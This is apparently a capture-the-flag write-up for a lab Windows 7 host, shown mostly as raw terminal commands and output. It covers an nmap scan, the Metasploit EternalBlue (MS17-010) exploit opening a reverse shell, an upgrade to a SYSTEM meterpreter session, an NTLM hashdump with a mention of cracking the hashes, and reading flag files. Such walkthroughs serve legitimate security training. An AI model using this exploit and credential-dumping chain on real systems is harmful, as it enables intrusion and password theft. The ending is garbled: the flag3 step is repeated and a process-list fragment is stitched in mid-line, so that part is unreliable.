cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2020-03-25T09:28:55-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-25T14:28:55 |_ start_date: 2020-03-25T14:11:35\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done at Wed Mar 25 10:30:01 2020 \u0026ndash; 1 IP address (1 host up) scanned in 215.17 seconds\n 2. We find 3 ports with port number under 1000: * 135 * 139 * 445 3. We see that the machine is running Windows \u0026amp; SP 1. We look for exploits for this OS on google, and one that mostly comes up is the vulnerability ms17-010. # Task 2: Gain access 1. We start metasploit msfconsole [-] ***rting the Metasploit Framework console\u0026hellip;\n[-] * WARNING: No database support: No database YAML file [-] ***\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMM MMMN$ vMMMM MMMNl MMMMM MMMMM JMMMM MMMNl MMMMMMMN NMMMMMMM JMMMM MMMNl MMMMMMMMMNmmmNMMMMMMMMM JMMMM MMMNI MMMMMMMMMMMMMMMMMMMMMMM jMMMM MMMNI MMMMMMMMMMMMMMMMMMMMMMM jMMMM MMMNI MMMMM MMMMMMM MMMMM jMMMM MMMNI MMMMM MMMMMMM MMMMM jMMMM MMMNI MMMNM MMMMMMM MMMMM jMMMM MMMNI WMMMM MMMMMMM MMMM# JMMMM MMMMR ?MMNM MMMMM .dMMMM MMMMNm ?MMM MMMM dMMMMM MMMMMMN ?MM MM? NMMMMMN MMMMMMMMNe JMMMMMNMMM MMMMMMMMMMNm, eMMMMMNMMNMM MMMMNNMNMMMMMNx MMMMMMNMMNMMNM MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM https://metasploit.com\n =[ metasploit v5.0.60-dev ]   \u0026ndash; \u0026ndash;=[ 1947 exploits - 1089 auxiliary - 333 post ] \u0026ndash; \u0026ndash;=[ 556 payloads - 45 encoders - 10 nops ] \u0026ndash; \u0026ndash;=[ 7 evasion ]   2. We search for exploits for the vulnerability ms17-010: msf5 \u0026gt; search ms17-010\nMatching Modules Name Disclosure Date Rank Check Description\n  ----- -----------  0 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 1 auxiliary/scanner/smb/smb_ms17_010 normal Yes MS17-010 SMB RCE Detection 2 exploit/windows/smb/doublepulsar_rce 2017-04-14 great Yes DOUBLEPULSAR Payload Execution and Neutralization 3 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 4 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 5 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n Here, we will use the exploit ```exploit/windows/smb/ms17_010_eternalblue```. msf5 \u0026gt; use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt;\n## Info: Description: This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads. References: https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010 https://cvedetails.com/cve/CVE-2017-0143/ https://cvedetails.com/cve/CVE-2017-0144/ https://cvedetails.com/cve/CVE-2017-0145/ https://cvedetails.com/cve/CVE-2017-0146/ https://cvedetails.com/cve/CVE-2017-0147/ https://cvedetails.com/cve/CVE-2017-0148/ https://github.com/RiskSense-Ops/MS17-010 3. We check the options for this exploit: msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; options\nModule options (exploit/windows/smb/ms17_010_eternalblue):\nName Current Setting Required Description\n RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026lsquo;file:\u0026rsquo; RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target.\nExploit target:\nId Name\n 0 Windows 7 and Server 2008 R2 (x64) All Service Packs\n We see that we have to set out RHOSTS whick will be our target machine.So, we set RHOST with the ip address of the windows machine from the site: msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set RHOSTS 10.10.221.176 RHOSTS =\u0026gt; 10.10.221.176\n 4. We run the exploit. msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run\n[] Started reverse TCP handler on 10.8.30.133:4444 [+] 10.10.247.170:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [] 10.10.247.170:445 - Connecting to target for exploitation. [+] 10.10.247.170:445 - Connection established for exploitation. [+] 10.10.247.170:445 - Target OS selected valid for OS indicated by SMB reply [] 10.10.247.170:445 - CORE raw buffer dump (42 bytes) [] 10.10.247.170:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [] 10.10.247.170:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [] 10.10.247.170:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.247.170:445 - Target arch selected valid for arch indicated by DCE/RPC reply [] 10.10.247.170:445 - Trying exploit with 12 Groom Allocations. [] 10.10.247.170:445 - Sending all but last fragment of exploit packet [] 10.10.247.170:445 - Starting non-paged pool grooming [+] 10.10.247.170:445 - Sending SMBv2 buffers [+] 10.10.247.170:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [] 10.10.247.170:445 - Sending final SMBv2 buffers. [] 10.10.247.170:445 - Sending last fragment of exploit packet! [] 10.10.247.170:445 - Receiving response from exploit packet [+] 10.10.247.170:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [] 10.10.247.170:445 - Sending egg to corrupted connection. [] 10.10.247.170:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.8.30.133:4444 -\u0026gt; 10.10.247.170:49184) at 2020-03-25 15:17:21 -0400 [+] 10.10.247.170:445\n =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.247.170:445 =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.247.170:445 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=  Copyright (c) 2009 Microsoft Corporation. All rights reserved.\nC:\\Windows\\system32\u0026gt;\n Voila! we got a shell! 5. We background the shell using Ctrl+z ## Task 3: Escalate 1. In order to convert the shell to a meterpreter shell, we use the following exploit: msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; use post/multi/manage/shell_to_meterpreter msf5 post(multi/manage/shell_to_meterpreter) \u0026gt;\n 2. We check the options for this exploit: msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; options\nModule options (post/multi/manage/shell_to_meterpreter):\nName Current Setting Required Description\n HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on.\n So the option that we are required to change is ```SESSION``` 3. In order to ser the option session we need the session id of our previously opened shell. To find the session id, we enter the command ```sessions -l``` msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions -l\nActive sessions Id Name Type Information Connection\n 1 shell x64/windows Microsoft Windows [Version 6.1.7601] 10.8.30.133:4444 -\u0026gt; 10.10.247.170:49184 (10.10.247.170)\n So, the session id is 1. We set the session msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set SESSION 1 SESSION =\u0026gt; 1\n 4. We run the exploit. msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run\n[] Upgrading session ID: 1 [] Starting exploit/multi/handler [] Started reverse TCP handler on 10.8.30.133:4433 [] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; [] Sending stage (180291 bytes) to 10.10.247.170 [] Meterpreter session 2 opened (10.8.30.133:4433 -\u0026gt; 10.10.247.170:49193) at 2020-03-25 15:24:05 -0400 [*] Stopping exploit/multi/handler\nmsf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions\nActive sessions Id Name Type Information Connection\n  1 shell x64/windows Microsoft Windows [Version 6.1.7601] 10.8.30.133:4444 -\u0026gt; 10.10.247.170:49184 (10.10.247.170) 2 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.8.30.133:4433 -\u0026gt; 10.10.247.170:49193 (10.10.247.170)\n We see that we got a meterpreter shell! 5. We can interact with th meterpreter shell using the following command: msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions -i 2 [*] Starting interaction with 2\u0026hellip;\nmeterpreter \u0026gt;\n 6. We run getsystem, shell and whoami to check if we have escalated to NT AUTHORITY\\SYSTEM meterpreter \u0026gt; getsystem \u0026hellip;got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). meterpreter \u0026gt; shell Process 2216 created. Channel 1 created. Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved.\nC:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system\nC:\\Windows\\system32\u0026gt;\n So, we are in fact system! 7. We enter the command ```ps``` to view the running processes C:\\Windows\\system32\u0026gt;^Z Background channel 1? [y/N] y meterpreter \u0026gt; ps\nProcess List PID PPID Name Arch Session User Path\n  0 0 [System Process] 4 0 System x64 0 396 652 LogonUI.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\LogonUI.exe 416 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\smss.exe 428 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 536 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 552 544 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 600 544 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wininit.exe 612 592 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 652 592 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\winlogon.exe 700 600 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\services.exe 708 600 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsass.exe 716 600 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsm.exe 824 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 892 700 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 940 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1012 824 WmiPrvSE.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\wbem\\WmiPrvSE.exe 1068 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1160 700 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 1292 700 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1328 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1380 2856 powershell.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 1392 700 amazon-ssm-agent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe 1468 700 LiteAgent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Xentools\\LiteAgent.exe 1588 700 Ec2Config.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Ec2ConfigService\\Ec2Config.exe 1780 552 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 1856 2200 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe 1936 552 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 1940 700 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 2144 552 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 2200 700 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe 2216 2504 cmd.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\SysWOW64\\cmd.exe 2328 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 2360 700 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\sppsvc.exe 2428 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 2504 1380 powershell.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe 2560 700 vds.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\vds.exe 2664 700 SearchIndexer.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\SearchIndexer.exe 2796 1292 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\cmd.exe 3020 700 TrustedInstaller.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\servicing\\TrustedInstaller.exe\n We write down the process id 2796. 8. We migrate to the process whose id we noted: meterpreter \u0026gt; migrate 2796 [] Migrating from 2504 to 2796\u0026hellip; [] Migration completed successfully.\n ## Task 4: Cracking 1. We run the command hashdump. meterpreter \u0026gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::\n So the user is Jon. 2. Windows uses LM and NTLM hashing. We crack the hashes using hashcat  ## Task 5: Find flags! 1. meterpreter \u0026gt; cd C:\\\nmeterpreter \u0026gt; ls Listing: C:\\ Mode Size Type Last modified Name\n 40777/rwxrwxrwx 0 dir 2009-07-13 23:18:56 -0400 $Recycle.Bin 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Documents and Settings 40777/rwxrwxrwx 0 dir 2009-07-13 23:20:08 -0400 PerfLogs 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files (x86) 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:08 -0400 ProgramData 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:22 -0500 Recovery 40777/rwxrwxrwx 4096 dir 2018-12-12 18:01:17 -0500 System Volume Information 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Users 40777/rwxrwxrwx 16384 dir 2009-07-13 23:20:08 -0400 Windows 100666/rw-rw-rw- 24 fil 2018-12-12 22:47:39 -0500 flag1.txt 0000/\u0026mdash;\u0026mdash;\u0026mdash; 2141120 fif 1970-01-30 18:20:00 -0500 hiberfil.sys 0000/\u0026mdash;\u0026mdash;\u0026mdash; 2141120 fif 1970-01-30 18:20:00 -0500 pagefile.sys\nmeterpreter \u0026gt; cat flag1.txt flag{access_the_machine}\n 2. meterpreter \u0026gt; pwd C:\\Windows\\System32\\config meterpreter \u0026gt; ls Listing: C:\\Windows\\System32\\config Mode Size Type Last modified Name\n 100666/rw-rw-rw- 28672 fil 2009-07-14 01:32:39 -0400 BCD-Template 100666/rw-rw-rw- 25600 fil 2009-07-14 01:38:35 -0400 BCD-Template.LOG 100666/rw-rw-rw- 18087936 fil 2009-07-13 22:34:08 -0400 COMPONENTS 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:31 -0400 COMPONENTS.LOG 100666/rw-rw-rw- 13312 fil 2009-07-13 22:34:08 -0400 COMPONENTS.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 COMPONENTS.LOG2 100666/rw-rw-rw- 1048576 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms 100666/rw-rw-rw- 1048576 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms 100666/rw-rw-rw- 1048576 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms 100666/rw-rw-rw- 65536 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf 100666/rw-rw-rw- 65536 fil 2009-07-14 00:54:56 -0400 COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2009-07-14 00:54:56 -0400 COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2009-07-14 00:54:56 -0400 COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 DEFAULT 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:31 -0400 DEFAULT.LOG 100666/rw-rw-rw- 177152 fil 2009-07-13 22:34:08 -0400 DEFAULT.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 DEFAULT.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:22:09 -0400 DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 40777/rwxrwxrwx 0 dir 2009-07-13 23:20:10 -0400 Journal 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:10 -0400 RegBack 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SAM 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:31 -0400 SAM.LOG 100666/rw-rw-rw- 21504 fil 2009-07-13 22:34:08 -0400 SAM.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SAM.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:22:09 -0400 SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SECURITY 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:30 -0400 SECURITY.LOG 100666/rw-rw-rw- 21504 fil 2009-07-13 22:34:08 -0400 SECURITY.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SECURITY.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:22:08 -0400 SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 40632320 fil 2009-07-13 22:34:08 -0400 SOFTWARE 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:30 -0400 SOFTWARE.LOG 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SOFTWARE.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SOFTWARE.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:21:18 -0400 SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:18 -0400 SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:18 -0400 SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 12582912 fil 2009-07-13 22:34:08 -0400 SYSTEM 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:30 -0400 SYSTEM.LOG 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SYSTEM.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SYSTEM.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:21:15 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:15 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:15 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:10 -0400 TxR 100666/rw-rw-rw- 34 fil 2018-12-12 22:48:22 -0500 flag2.txt 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:10 -0400 systemprofile\nmeterpreter \u0026gt; cat flag2.txt flag{sam_database_elevated_access}\n 3. meterpreter \u0026gt; cd Users lmeterpreter \u0026gt; ls Listing: C:\\Users Mode Size Type Last modified Name\n 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 All Users 40555/r-xr-xr-x 8192 dir 2009-07-13 23:20:08 -0400 Default 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Default User 40777/rwxrwxrwx 8192 dir 2018-12-12 22:13:28 -0500 Jon 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Public 100666/rw-rw-rw- 174 fil 2009-07-14 00:54:24 -0400 desktop.ini\nmeterpreter \u0026gt; cd Jon meterpreter \u0026gt; ls Listing: C:\\Users\\Jon Mode Size Type Last modified Name\n 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 AppData 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Application Data 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:37 -0500 Contacts 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Cookies 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Desktop 40555/r-xr-xr-x 4096 dir 2018-12-12 22:13:31 -0500 Documents 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Downloads 40555/r-xr-xr-x 4096 dir 2018-12-12 22:13:31 -0500 Favorites 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Links 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Local Settings 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Music 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Documents 100666/rw-rw-rw- 524288 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT 100666/rw-rw-rw- 65536 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 NetHood 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Pictures 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 PrintHood 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Recent 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Saved Games 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:45 -0500 Searches 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 SendTo 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Start Menu 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Templates 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Videos 100666/rw-rw-rw- 262144 fil 2018-12-12 22:13:31 -0500 ntuser.dat.LOG1 100666/rw-rw-rw- 0 fil 2018-12-12 22:13:31 -0500 ntuser.dat.LOG2 100666/rw-rw-rw- 20 fil 2018-12-12 22:13:31 -0500 ntuser.ini\nmeterpreter \u0026gt; cd Documents meterpreter \u0026gt; ls Listing: C:\\Users\\Jon\\Documents Mode Size Type Last modified Name\n 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Music 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Pictures 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Videos 100666/rw-rw-rw- 402 fil 2018-12-12 22:13:45 -0500 desktop.ini 100666/rw-rw-rw- 37 fil 2018-12-12 22:49:18 -0500 flag3.txt\nmeterpreter \u0026gt; cat flag3.txt flag{admin_documents_can_be_valuable}\\Users\\Jon\\Documents Mode Size Type Last modified Name\n 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Music 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Pictures 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Videos 100666/rw-rw-rw- 402 fil 2018-12-12 22:13:45 -0500 desktop.ini 100666/rw-rw-rw- 37 fil 2018-12-12 22:49:18 -0500 flag3.txt\nmeterpreter \u0026gt; cat flag3.txt flag{admin_documents_can_be_valuable}C:\\Windows\\System32\\LogonUI.exe 416 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\smss.exe 428 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 536 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 552 544 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 600 544 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wininit.exe 612 592 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 652 592 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\winlogon.exe 700 600 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\services.exe 708 600 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsass.exe 716 600 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsm.exe 824 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 892 700 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 940 700 svchost.exe x64 0 NT 